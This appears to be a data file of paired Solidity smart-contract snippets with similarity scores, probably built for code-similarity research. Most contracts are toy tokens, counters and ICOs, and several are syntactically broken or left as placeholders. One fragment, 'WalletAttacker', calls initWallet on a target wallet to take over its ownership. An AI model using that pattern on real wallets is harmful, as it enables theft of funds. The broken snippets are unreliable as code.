    function balanceOf( address who ) constant returns (uint value);
}"
"contract Election {

    struct Candidate {
        string name;
        uint voteCount;
    }

    struct Voter {
    bool authorized;
    bool voted;
    uint vote;
    } 
    address public owner;
    string public electionName;

    mapping(address => Voter) public voters;
    Candidate[] public candidates;
    uint public totalVotes;

    modifier ownerOnly() {
        require(msg.sender == owner);
        _;
    }

    function Election(string _name) public {
        owner = msg.sender;
        electionName = _name;
    }

    function addCandidate(string _name) ownerOnly public {
        candidates.push(Candidate(_name,0));  
    }

    function getNumCandidate() public view returns(uint){
        returns candidates.length;
    }  

    function authorize(address _person) ownerOnly public{
        voters[_person].authorized = true;
    }

    function vote(uint _voteIndex) public {
        require(!voters[msg.sender].voted);
        require(voters[msg.sender].authorized);

        voters[msg.sender].vote = _voteIndex;
        voters[msg.sender].voted = true;

        candidates[_voteIndex].voteCount +=1;
        totalVotes +=1;
    }

    function end() ownerOnly public {
        selfdestruct(owner);
    }
}",0.6169868944108365,"contract MeerkatICO {

    iERC20 token;

    address owner;

    address tokenCo;

    uint rateMe;

    

    modifier ownerOnly() {

        require(msg.sender == owner);

        _;

    }





    

    

   constructor(address _main) public {

        token = iERC20(_main);

        tokenCo = _main;

        owner = msg.sender;

        rateMe = 0;

    }



    

    function withdraw() public ownerOnly {

        owner.transfer(address(this).balance);

    }



    

    

    

    function setRate(uint _rateMe) public ownerOnly {

        rateMe = _rateMe;

    }

    

    function CurrentRate() public constant returns (uint rate) {

        return rateMe;

    }

    

    function TokenLinked() public constant returns (address _token, uint _amountLeft) {

        return (tokenCo, (token.balanceOf(address(this)) / 10**18)) ;

    }

    

    

    

    

    

    function transferAnyERC20Token(address tokenAddress, uint tokens) public ownerOnly returns (bool success) {

        return iERC20(tokenAddress).transfer(owner, tokens);

    }



    

    

	

    function () public payable {

        

	    

        require( (msg.value >= 100000000000000000) && (rateMe != 0) );

        

        uint value = msg.value * rateMe;

        

        

        require(value/msg.value == rateMe);

        

        token.transfer(msg.sender, value);

        

    }

}"
"contract Solitaire {
    uint randomNonce = 0;
    uint[] randomNumArray;

    event Deposit(address user, uint256 amout);

    constructor() public payable{
    }

    function GetNonce() public returns (uint) {
        return randomNonce ++;
    }

    function () public payable{
        uint value = GetNonce() + 20;
        emit Deposit(msg.sender, value);

    }
}",0.6598815351028049,"contract Nonce {
    event IncrementEvent(address indexed _sender, uint256 indexed _newNonce);
    uint256 value;
    
    function increment() public returns (uint256) {
        value = ++value;
        emit IncrementEvent(msg.sender, value);
        return value;
    }
    
    function getValue() public view returns (uint256) {
        return value;
    }
}"
"contract CallTest {
    event logSendEvent(address to, uint256 value);
    event depositvalue(address sender, uint256 value);



    function transferEther(address towho) public payable {
        require(address(this).balance > 100000000000000000, ""Contract address does not exist enough money."");
        towho.transfer(100000000000000000);
        emit logSendEvent(towho, 100000000000000000);
    }

    function deposit() public payable {
        emit depositvalue(msg.sender, msg.value);
    }

    function GetBalance() public view returns(uint256) {
        return address(this).balance;
    }

    constructor() public payable{
    }
}",0.6385303286170336,"contract BasicToken is ERC20Basic {

    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    
    uint64 public dateTransferable = 1518825600;

    
    function transfer(address _to, uint256 _value) public returns (bool) {
        uint64 _now = uint64(block.timestamp);
        require(_now >= dateTransferable);
        require(_to != address(this)); 
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(msg.sender, _to, _value);
        return true;
    }

    
    function balanceOf(address _address) public view returns (uint256) {
        return balances[_address];
    }
}"
"contract C {   mapping (string => uint) counter;   
function inc(string _s) { counter[_s]++; } }",0.6895607549981266,"contract Counter {
    uint public counter;
    function increment() public { counter++; }
}"
"contract NamingTest {
    uint256 test;

    function set_test_value(uint256 _value) external payable {
        test = _value;
    }

    function setTestValue(uint256 _value) external payable {
        test = _value;
    }

    function settestvalue(uint256 _value) external payable {
        test = _value;
    }

    function set(uint256 _value) external payable {
        test = _value;
    }

    function getTest() external view returns (uint256) {
        return test;
    }
}",0.637373790846091,"contract EggCore {

    function ownerOf(uint256) external view returns (address);

    function get(uint256) external view returns (uint256[2], uint8);

    function isOwner(address, uint256) external view returns (bool);

    function getAllEggs() external view returns (uint256[]);

    function create(address, uint256[2], uint8) external returns (uint256);

    function remove(address, uint256) external;

}"
"contract Bookkeeping {

uint counter;

function Bookkeeping() {
    counter = 0;
}

function notify(uint count) returns(uint) {
    counter = count+5;
    return counter;
}

function getCurrentCounter() constant returns(uint) {
    return counter;
}


}",0.6767304748215939,"contract Smartcontract_counter {

    int private count = 0;

    function incrementCounter() public {

        count += 1;

    }

    function decrementCounter()public {

        count -= 1;

    }

    function getCount() public view returns (int) {

        return count;

    }

}"
"contract ABC {

    bytes32 public name;
    uint public value;

    function ABC(bytes32 _name, uint _val) public {
        name = _name;
        value = _val;
    }
}",0.6346675077936555,"contract Contract {
    bytes32 public Name;

    
    
    constructor(bytes32 _contractName) public {
        Name = _contractName;
    }

    function() public payable { }
}"
"contract Adoption {
    address[16] public adopters;

    
    function adopt(uint petId) public returns (uint) {
        require(petId >= 0 && petId <= 15);

        adopters[petId] = msg.sender;

        return petId;
    }   
}",0.6141195566351624,"contract ERC20 {
    function transfer(address dst, uint wad) public returns (bool);
    function transferFrom(address src, address dst, uint wad) public returns (bool);
}"
"contract Campaign {
     struct Request {
         string description;
         uint32 value;
         address recipient;
         bool complete;
         uint approvalCount;
         mapping(address => bool) approvals;
     }

     Request[] public requests;
     address public manager;
     uint32 public minimumContribution;
    
     mapping(address => bool) public contributors;
     uint32 public contributorCount;

     modifier restricted {
         require(msg.sender == manager );
        _;
     }


     constructor(uint32 minimum) public {
         manager = msg.sender;
         minimumContribution = minimum;
     }

     function contribute() public payable{
         require(msg.value > minimumContribution);

         contributors[msg.sender] = true; 
         contributorCount++;
     }

     function createRequest(string description, uint32 value, address recipient) 
        public restricted {
         Request memory newRequest = Request({
            description: description, 
            value: value, 
            recipient: recipient, 
            complete: false,
            approvalCount: 0
         });

         requests.push(newRequest);
     }

     function approveRequest(uint16 index) public {
         Request storage r = requests[index];

         
         require(contributors[msg.sender]); 
         require(!r.approvals[msg.sender]);

         r.approvals[msg.sender] = true;
         r.approvalCount++;
     }

     function finalizeRequest(uint16 index) public restricted {
         Request storage r = requests[index];

         
         require(r.approvalCount > (contributorCount / 2));
         
         require(!r.complete);

         
         r.recipient.transfer(r.value);


         
         r.complete = true;
     }

 }",0.605798035036048,"contract Request {

    

    string public name = ""Request Network"";

    string public symbol = ""REQ"";

    uint8 public decimals = 18;

    

    uint256 public totalSupply;

    uint256 public tokenSupply = 999986586;

    uint256 public buyPrice = 7350;

    address public creator;

    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);

    event FundTransfer(address backer, uint amount, bool isContribution);

    

    

    

    function Request() public {

        totalSupply = tokenSupply * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;    

        creator = msg.sender;

    }

    

    function _transfer(address _from, address _to, uint _value) internal {

        

        require(_to != 0x0);

        

        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value >= balanceOf[_to]);

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        Transfer(_from, _to, _value);

      

    }



    

    function transfer(address _to, uint256 _value) public {

        _transfer(msg.sender, _to, _value);

    }



    

    

    

    function () payable internal {

        uint amount = msg.value * buyPrice;                    

        uint amountRaised;                                     

        amountRaised += msg.value;                            

        require(balanceOf[creator] >= amount);               

        balanceOf[msg.sender] += amount;                  

        balanceOf[creator] -= amount;                        

        Transfer(creator, msg.sender, amount);               

        creator.transfer(amountRaised);

    }



 }"
"contract D {
  uint public n;
  address public sender;

  function delegatecallSetN(address _e, uint _n) {
    _e.delegatecall(bytes4(sha3(""setN(uint256)"")), _n); 
  }
}",0.6532805263163667,"contract DCMLike {
    function open(bytes32 ilk, address usr) public returns (uint);
    function enter(address src, uint cdp) public;
}"
"contract E {
  uint public n;
  address public sender;
  function setN(uint _n) {
    n = _n;
    sender = msg.sender;
  }
}",0.6412283168795848,"contract Coin {

    address public owners;

    function getOwner(uint index) public view returns (address, uint256);

}"
"contract test002 {

    address[] AddressList;

    event ItemAdded(address, address);


    function getItemCount() public view returns(uint) {return(AddressList.length);}
    function getItem(uint index) public view returns(address) {return(AddressList[index]);}

    function addItem(address inItem) public {
        AddressList[AddressList.length] = inItem;
        ItemAdded(this, inItem);
    }

}",0.6592807288605922,"contract UserRegistryInterface {
  event AddAddress(address indexed who);
  event AddIdentity(address indexed who);

  function knownAddress(address _who) public constant returns(bool);
  function hasIdentity(address _who) public constant returns(bool);
  function systemAddresses(address _to, address _from) public constant returns(bool);
}"
"contract StrangeToken {

  uint256 private repurchasePrice;   
  mapping(address => uint256) balances;

  function setPrice(uint256 price) {   
   repurchasePrice = price;   
  }  
}",0.6291923845861178,"contract Token {
    mapping(address => uint256) public balanceOf;
    function transfer(address to, uint256 value) public returns (bool success) {

    }
}"
"contract OwnedToken {

TokenCreator creator;
address owner;
bytes32 name;

function OwnedToken(bytes32 _name) {
    owner = msg.sender;

    creator = TokenCreator(msg.sender);
    name = _name;
}
function changeName(bytes32 newName) {

    if (msg.sender == creator) name = newName;
}
function transfer(address newOwner) {
    if (msg.sender != owner) return;

    if (creator.isTokenTransferOK(owner, newOwner))
        owner = newOwner;
}


contract TokenCreator {
    function createToken(bytes32 name)
       returns (OwnedToken tokenAddress)
    {

        return new OwnedToken(name);
    }
    function changeName(OwnedToken tokenAddress, bytes32 name) {

        tokenAddress.changeName(name);
    }
    function isTokenTransferOK(
        address currentOwner,
        address newOwner
    ) returns (bool ok) {
        address tokenAddress = msg.sender;
        return (sha3(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);
    }
}",0.628433986608947,"contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(isOwner(), ""Ownable: caller is not the owner"");
        _;
    }

    
    function isOwner() public view returns (bool) {
        return _msgSender() == _owner;
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), ""Ownable: new owner is the zero address"");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}"
"contract Adoption {
    address[16] public adopters;

    function returnEth() public payable {
    msg.sender.transfer(msg.value);
    }
    
    function adopt(uint petId) public payable returns (uint) {
        require(petId >= 0 && petId <= 15);
        
        adopters[petId] = msg.sender;
        returnEth();
        return petId;
        
    }
    
    function getAdopters() public view returns (address[16]) {
        return adopters;
    }


}",0.6399128672888186,"contract GetTest{

    uint a = 1;

    string b = ""b"";

    address c;

    constructor() public {

        c = msg.sender;

    }

    function getOne() public constant returns(uint) {

        return a;

    }

    function getTwo() public constant returns(uint, string){

        return (a, b);

    }

    function getThree() public constant returns (uint, string, address){

        return (a, b, c);

    }

}"
"contract FileList {

   
   struct File {
      uint256 id;
      string ipfshash;
      bytes32 filename;
      bytes32[5] tags;
      address owner;
      uint256 timestamp;
   }
   uint256 public constant maxAmountOfFiles = 1000;
   
   mapping(address => File[maxAmountOfFiles]) public files;
   
   mapping(address => uint256) public lastIds;
   

   
   
   
   function getFileTags(address owner, uint256 _index) external view returns (bytes32[5]) {
       return files[owner][_index].tags;
  }

}",0.6351369977755135,"contract IERC20Allowance {



    

    

    



    event Approval(

        address indexed owner,

        address indexed spender,

        uint256 amount

    );



    

    

    



    

    

    

    

    

    function allowance(address owner, address spender)

        public

        constant

        returns (uint256 remaining);



    

    

    

    

    

    

    function approve(address spender, uint256 amount)

        public

        returns (bool success);



    

    

    

    

    

    

    function transferFrom(address from, address to, uint256 amount)

        public

        returns (bool success);



}"
"contract Purchase {
  uint public amount;
  address public seller;
  address public buyer;

  function Purchase(address addr, uint _amount) {
    seller = addr;
    amount = _amount;
  }

  function confirmPurchase(address _buyer, uint val) {
    buyer = _buyer;
    if ( val == amount) {
      buyer.transfer(amount);
      seller.transfer(this.balance);
      seller.balance;
    }
  }

  function getBalance() returns (uint balance) {
    return seller.balance;
  }

  function getAddr() returns (address) {
    return msg.sender;

  }
}",0.6748949493000072,"contract ERC20 {

	function balanceOf(address _owner) public constant returns (uint256 balance);

	function transfer(address _to, uint256 _amount) public returns (bool success);

	function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);

	function allowance(address _owner, address _spender) public constant returns (uint256 remaining);

	function totalSupply() public constant returns (uint);

}"
"contract WeatherApiCall is usingOraclize {
       string public weathercondition;
       event LOG_OraclizeCallback(
              bytes32 queryId,
              string result
       );
       function WeatherApiCall() {
            OAR = OraclizeAddrResolverI(0x44bc501f0d92a9583877636828f52abc9da5d585);
      }
      function __callback(bytes32 myid, string result) {
              if (msg.sender != oraclize_cbAddress()) throw;
              weathercondition=result;
              LOG_OraclizeCallback(myid,result);
      }
      function update(string to,string datetime) payable returns(bool sufficient) {

              oraclize_query(""URL"", strConcat(""json(http:
              return true;
  }
}",0.6251648331467211,"contract YoutubeViews is usingOraclize {

    string public viewsCount;

    event LogYoutubeViewCount(string views);
    event LogNewOraclizeQuery(string description);

    constructor()
        public
    {
        update(); 
    }

    function __callback(
        bytes32 _myid,
        string memory _result
    )
        public
    {
        require(msg.sender == oraclize_cbAddress());
        viewsCount = _result;
        emit LogYoutubeViewCount(viewsCount);
        
    }

    function update()
        public
        payable
    {
        emit LogNewOraclizeQuery(""Oraclize query was sent, standing by for the answer..."");
        oraclize_query(""URL"", 'html(https:
    }
}"
"contract MyContract {
struct Account {
    address owner;
    boolean active;
}

mapping( address => Account) allAccounts;

function AddAccount(address newAddress) public returns (bool success ) {
    allAccounts[newAddress].owner = newAddress;
    allAccounts[newAddress].active = true;
    return true;
}

function GetAccount(address _address) public view returns( address owner, boolean active) {
    return (allAccounts[_address].owner, allAccounts[_address].active);
}
}",0.627361473814713,"contract AddressHolder {

    address[] internal addresses;



    function inArray(address _addr) public view returns(bool){

        for(uint i = 0; i < addresses.length; i++){

            if(_addr == addresses[i]){

                return true;

            }

        }

        return false;

    }



    function addAddress(address _addr) public {

        addresses.push(_addr);

    }



    function showAddresses() public view returns(address[] ){

        return addresses;

    }



    function totalUsers() public view returns(uint count){

        return addresses.length;

    }

}"
contract Multiply7 { event Print(uint); function multiply(uint input) returns (uint) { Print(input * 7); return input * 7; } },0.6076078062207955,"contract PureLoop
{
    function execute() public pure returns (uint output) {
        uint num;
        while(true) {
            num++;
        }
        return num;
    }
}"
"contract PQ {
struct Node {
    int256 key;
    address value;
}    
Node[7] private heapKeyValue;   
function insert(int256 key, address addr) public {
      .. Implementation ..
}
function get_min() public view returns (int256) {
    return heapKeyValue[0].key;
}
function heapify(uint8 idx) internal {
      ..Implementation..
}
}",0.6460400767224034,"contract ERC20Mintable  {
    
    function mint(address to, uint256 value) public returns (bool) {
    }
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function addMinter(address account) public;
    function renounceMinter() public;
}"
"contract tokensHolder {
  
   
   bytes32 eZn =   0x655a415200000000000000000000000000000000000000000000000000000000;

    function stringsEqual(string storage _a, string memory _b) internal returns (bool) {
    bytes storage a = bytes(_a);
    bytes memory b = bytes(_b);
    if (a.length != b.length)
      return false;
    
    for (uint i = 0; i < a.length; i ++)
      if (a[i] != b[i])
        return false;
    return true;
  }

  event bought(address indexed Buyer, bytes32 Token ,uint amount, uint _price);
  event sold(address indexed seller,bytes32 Token ,uint amount, uint _price);
  event exchange(address Transferer ,address reciver ,uint amount ,bytes32 token);
  event faliure(address attempter, string attempted,uint amount,string reason);
  event newZARVal(uint NewValueInWei,address owner);
  event tokenAdded(address adder,string unit,uint dp,bytes32 tokenName);

  modifier OnlyOwner {
    if (msg.sender != owner){
      faliure(msg.sender,""owner only function"",0,""not the owner"");
      throw ;
    }  
    _
  }
  modifier notMyself {

    if (msg.sender == address(this)){
      throw;
    } 
    _
  }

  struct stk {
    mapping (address => uint ) balance;
    address minter;
    string unit;
    uint eZARVal; 
    uint dp;
  }

  mapping (bytes32 => stk ) tokenList ;
  address owner ;

  function tokensHolder(uint _ezarvalinwei){
    owner = msg.sender ;
    tokenList[(eZn)] = stk({
      minter:owner,
      unit: ""eZAR"",
      eZARVal: _ezarvalinwei, 
      dp: 4 
    });
  }

  function sellTknZ(bytes32 _tknName , uint _amount) notMyself  returns (uint){

    if (tokenList[_tknName].balance[msg.sender] >= _amount * 10**tokenList[_tknName].dp){
      uint tokenValue = tokenList[(_tknName)].eZARVal * 1000 * _amount;
      tokenList[(_tknName)].balance[msg.sender] -= _amount;
        tokenList[(eZn)].balance[msg.sender] += tokenValue;
      sold(msg.sender,_tknName,_amount,tokenList[(_tknName)].eZARVal);
    }else{
      faliure(msg.sender,""Selling tokens"",_amount,""Insufficent Funds"");
      throw;
    }
  }

  function buyTknZ(bytes32 _tknName, uint _amount) notMyself  {
    uint tokenCost = tokenList[(_tknName)].eZARVal * 1000 * _amount ;
    if (tokenList[(eZn)].balance[msg.sender]  < tokenCost ){
      faliure(msg.sender,""buyingtokens"",_amount,""Insufficent Funds"");
      throw;
    } else {
      uint tokenAdded;
      tokenList[(eZn)].balance[msg.sender] -= tokenCost;
      tokenList[(_tknName)].balance[msg.sender] += _amount * 10 ** tokenList[_tknName].dp;
      bought(msg.sender,_tknName,_amount,tokenList[(_tknName)].eZARVal);
    }
  }

  function getBalance(bytes32 _tknName)  returns (uint) {
    uint balance = tokenList[(_tknName)].balance[msg.sender];
    return balance;
  }

  function buyZ() notMyself {
    uint amount = msg.value / tokenList[(eZn)].eZARVal * 10000;
    if (amount<1) {
      faliure(msg.sender,""buyZ"",0,""PAY MORE ETHER"");
      throw;
    }else {
      tokenList[(eZn)].balance[msg.sender] += amount;
      bought(msg.sender,eZn,amount,tokenList[(eZn)].eZARVal);
    }
  }

  function sellZ(uint _amount) notMyself returns (uint){
    if (tokenList[(eZn)].balance[msg.sender] < _amount ){
      faliure(msg.sender,""sellZ"",_amount,""insuficient Funds"");
      throw;
    }else{
      tokenList[(eZn)].balance[msg.sender] -= _amount;
      msg.sender.send((tokenList[(eZn)].eZARVal )* _amount);
      sold(msg.sender,eZn,_amount,tokenList[(eZn)].eZARVal);
    }

  }

  function setZarVal(uint _amount) OnlyOwner returns (bool){
    tokenList[(eZn)].eZARVal = _amount;
    newZARVal(_amount,owner);
  }

  function replaceOwner(address _ownerNew) OnlyOwner{
    owner = _ownerNew;
  }

  function sendToken(bytes32 _tknName ,address _to, uint _amount) external{
    if (tokenList[_tknName].balance[msg.sender] >= _amount){
      tokenList[_tknName].balance[msg.sender] -= _amount;
      tokenList[_tknName].balance[_to] += _amount;
      exchange(msg.sender, _to,_amount,_tknName);
    }else {
      faliure(msg.sender,""sendToke"",_amount,""insufficient funds"");
      throw;
    }
  }

  function newToken(bytes32 _tknName,string  _unit,uint _eZARVal,uint _dp) {
    if (stringsEqual(tokenList[_tknName].unit,"""") ){
      tokenList[_tknName]= stk({
        minter : msg.sender,
        unit:_unit,
        eZARVal:_eZARVal,
        dp:_dp
      });
      tokenAdded(msg.sender,_unit,_dp,_tknName);
    }else{
      faliure(msg.sender,""add a token"",1,""token alreadyexists"");
      throw;
    }
  }

  
  }",0.6104250337818777,"contract TXTE is ERC20Detailed {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;

  string constant tokenName = ""Trexexchange Token"";
  string constant tokenSymbol = ""TXTE"";
  uint8  constant tokenDecimals = 18;
  uint256 _totalSupply = 100000000000000000000000000;
  uint256 public basePercent = 100;

  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    _mint(msg.sender, _totalSupply);
  }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }

  function findTenthPercent(uint256 value) public view returns (uint256)  {
    uint256 roundValue = value.ceil(basePercent);
    uint256 TenthPercent = roundValue.mul(basePercent).div(100000);
    return TenthPercent;
  }

  function transfer(address to, uint256 value) public returns (bool) {
    require(value <= _balances[msg.sender]);
    require(to != address(0));

    uint256 tokensToBurn = findTenthPercent(value);
    uint256 tokensToTransfer = value.sub(tokensToBurn);

    _balances[msg.sender] = _balances[msg.sender].sub(value);
    _balances[to] = _balances[to].add(tokensToTransfer);

    _totalSupply = _totalSupply.sub(tokensToBurn);

    emit Transfer(msg.sender, to, tokensToTransfer);
    emit Transfer(msg.sender, address(0), tokensToBurn);
    return true;
  }

  function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
    }
  }

  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));

    _balances[from] = _balances[from].sub(value);

    uint256 tokensToBurn = findTenthPercent(value);
    uint256 tokensToTransfer = value.sub(tokensToBurn);

    _balances[to] = _balances[to].add(tokensToTransfer);
    _totalSupply = _totalSupply.sub(tokensToBurn);

    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);

    emit Transfer(from, to, tokensToTransfer);
    emit Transfer(from, address(0), tokensToBurn);

    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _mint(address account, uint256 amount) internal {
    require(amount != 0);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function burn(uint256 amount) external {
    _burn(msg.sender, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(amount != 0);
    require(amount <= _balances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _balances[account] = _balances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function burnFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _burn(account, amount);
  }
}"
"contract Relay {
  address public currentVersion;
  address public owner;
  mapping (address => uint) user_amounts;


  modifier onlyOwner() {
    if (msg.sender != owner) {
        throw;
    }
    _;
  }

  function Relay(address initAddr) {
    currentVersion = initAddr;
    owner = msg.sender; 
  }

  function changeContract(address newVersion) public
  onlyOwner()
  {
    currentVersion = newVersion;
  }

  function() {
    if(!currentVersion.delegatecall(msg.data)) throw;
  }
}",0.6653697472849139,"contract Ownable {
  address public owner;
  function Ownable() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    if (msg.sender != owner){
      revert();
    }
    _;
  }

  modifier protected() {
      if(msg.sender != address(this)){
        revert();
      }
      _;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    if (newOwner == address(0)) {
      revert();
    }
    owner = newOwner;
  }

  function withdraw() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }
}"
"contract Transfer {
    address owner;

    function Transfer () {
        owner = msg.sender;
    }

    modifier isOwner ()
    {
        if (owner == msg.sender) {
            _;
        }
        else
        {
            revert();
        }
    }

    function sendEther (address dst) isOwner payable {
        if(msg.value<=0) revert();
        dst.transfer(msg.value);
    }

    function getBalance () constant isOwner returns (uint) {
        return msg.sender.balance;
    }

    function () payable  
    {
        if(msg.value<=0) revert();
        owner.transfer(msg.value);
    }

}",0.6971853634653401,"contract EtherTransferTo{

    address public owner;

    

    constructor() public {

    owner = msg.sender;

  }

  

    modifier onlyOwner() {

        require (msg.sender == owner);

        _;



    }

    

    function () payable public {

        

    }

    

    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    function withdraw(uint amount) onlyOwner returns(bool) {

        require(amount <= this.balance);

        owner.transfer(amount);

        return true;



    }

    



}"
"contract Lottery {
    address public manager;
    address[] public players;
    event Deposit(address _from, uint value);

    constructor() public {
        manager = msg.sender;
    }

    function enter() public payable {
        require(msg.value > .01 ether, 'Not enough ether');
        players.push(msg.sender);
    }

    function numberPlayers() public view returns(uint) {
        return players.length;
    }
}",0.6970387549136031,"contract Wallet {

    event Receive(address from, uint value);

    event Send(address to, uint value);



    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    function() public payable {

        emit Receive(msg.sender, msg.value);

    }



    function transfer(address to, uint value) public {

        require(msg.sender == owner);

        to.transfer(value);

        emit Send(to, value);

    }

}"
"contract AccessControl{
    address   public owner;
    Judge     public jc;

    constructor(address _jc) public {
        owner = msg.sender;
        jc = Judge(_jc);
    }

    function emitError(address subject) public returns (uint penalty) {
        penalty = jc.misbehaviorJudge(subject, owner, ""data"", ""read"", ""Too frequent access!"", now);
    }

}",0.6321537490638024,"contract TokenLocker {
    
    address public owner;

    ERC20 public token;

    
    function TokenLocker (ERC20 tokenAddr) public {
        owner = msg.sender;
        token = tokenAddr;
    }

    
    function transfer(address dest, uint amount) public returns (bool) {
        require(msg.sender == owner);
        return token.transfer(dest, amount);
    }

}"
"contract Judge {
    function misbehaviorJudge(address _subject, address _object, string memory _resource, string memory _action, string memory _misbehavior, uint _time) public returns (uint);
}",0.6517860637035989,"contract WhitelistInterface {

  function checkRole(address _operator, string memory _role) public view;

  function hasRole(address _operator, string memory _role) public view returns (bool);

}"
"contract Auction {
  event AuctionClosed (uint highestBid);  
  address public creator;
  function Auction () { 
    creator = msg.sender;
  }
  function closeAuction (uint someRandomBid) {
    if (msg.sender == creator) {  
      AuctionClosed (someRandomBid);  
      return;
    }
    throw;
  }
}",0.6315101928159333,"contract ZZ
{
    address creator;
    function ZZ() public payable {
        creator = msg.sender;
    }

    function getMessage() public pure returns (bytes32) {
        return ""ZZ loves mandy."";
    }
  
    function e() public { 
        if (msg.sender == creator)
            selfdestruct(creator);
    }
}"
"contract MyContr {
        function transfer(address payable receiver, uint amount) public {
            require(address(this).balance >= amount);
            receiver.transfer(amount);
        }
    }",0.6862893335424278,"contract WithdrawalContract is owned {

    function withdraw() public onlyOwner {
        uint amount = address(this).balance;
        msg.sender.transfer(amount);
    }
}"
"contract WalletAttacker {
   ...
  function stealOwnerShip() external {
        address[1] memory owners = [address(this)];
        uint _required = 1;
        uint _daylimit = 1000000000000000000;
        targetWallet.call(bytes4(keccak256(""initWallet(address[], uint, uint)"")), owners, _required, _daylimit);
    }
}",0.6070039359086826,"contract MultiSigWalletWithDailyLimitFactory is Factory {

    
    
    
    
    
    
    function create(address[] _owners, uint _required, uint _dailyLimit)
        public
        returns (address wallet)
    {
        wallet = new MultiSigWalletWithDailyLimit(_owners, _required, _dailyLimit);
        register(wallet);
    }
}"
"contract ManageMembers {

  address[] members;

  function AddMember(bytes32 name) public returns(address) {
    address member = new Contract(name);
    members.push(member);
    return member;
  } 
}",0.6208475766392086,"contract IContractRegistry {

    function addressOf(bytes32 _contractName) public view returns (address);



    

    function getAddress(bytes32 _contractName) public view returns (address);

}"
"contract Contract {
  bytes32 public Name;

  function Contract(bytes32 name) public {
    Name = name;
  }
}",0.6466755698941589,"contract IContractId {

    

    

    function contractId() public pure returns (bytes32 id, uint256 version);

}"
"contract ICO {

   uint public icoStart;
   uint public icoEnd;
   uint public tokenRate;
   OurToken public token;   
   uint public fundingGoal;
   uint public tokensRaised;
   uint public etherRaised;
   address public owner;
   address public extractor;

   modifier whenIcoCompleted {
      require(now>icoEnd);
      _;
   }

   modifier onlyOwner {
      require(msg.sender == owner);
      _;
   }

   modifier onlyExtractor {
      require(msg.sender == extractor || msg.sender == owner);
      _;
   }

   constructor(uint256 _icoStart, uint _icoEnd, uint _tokenRate, address _tokenAddress, uint _fundingGoal, address _extractor) public {

      require(_icoStart != 0 &&
      _icoEnd != 0 &&
      _icoStart < _icoEnd &&
      _tokenRate != 0 &&
      _tokenAddress != address(0) &&
      _fundingGoal != 0);
      icoStart = _icoStart;
      icoEnd = _icoEnd;
      tokenRate = _tokenRate;
      token = OurToken(_tokenAddress);
      fundingGoal = _fundingGoal;
      owner = msg.sender;
      extractor = _extractor;

   }

   function () public payable {
      buy();
   }

   function buy() public payable {

      require(msg.sender!=owner);
      require(tokensRaised < fundingGoal);
      require(now < icoEnd && now > icoStart);
      uint tokensToBuy;
      uint etherUsed = msg.value;
      tokensToBuy = (etherUsed/ 1 ether) * tokenRate;

      if(tokensRaised + tokensToBuy > fundingGoal) {
         uint exceedingTokens = tokensRaised + tokensToBuy - fundingGoal;
         uint exceedingEther;

         exceedingEther = (exceedingTokens * 1 ether) / tokenRate;
         msg.sender.transfer(exceedingEther);

         tokensToBuy -= exceedingTokens;
         etherUsed -= exceedingEther;
      }

      token.releaseTokens(msg.sender, tokensToBuy);


      tokensRaised += tokensToBuy;
      etherRaised += etherUsed;
   }

   function returnEther() public whenIcoCompleted {

       require(tokensRaised < fundingGoal);
       uint balance = token.balanceOf(msg.sender);
       uint etherToBeReturned = (balance / tokenRate) * 1 ether;
       msg.sender.transfer(etherToBeReturned);
       token.refundTokens(msg.sender,balance);
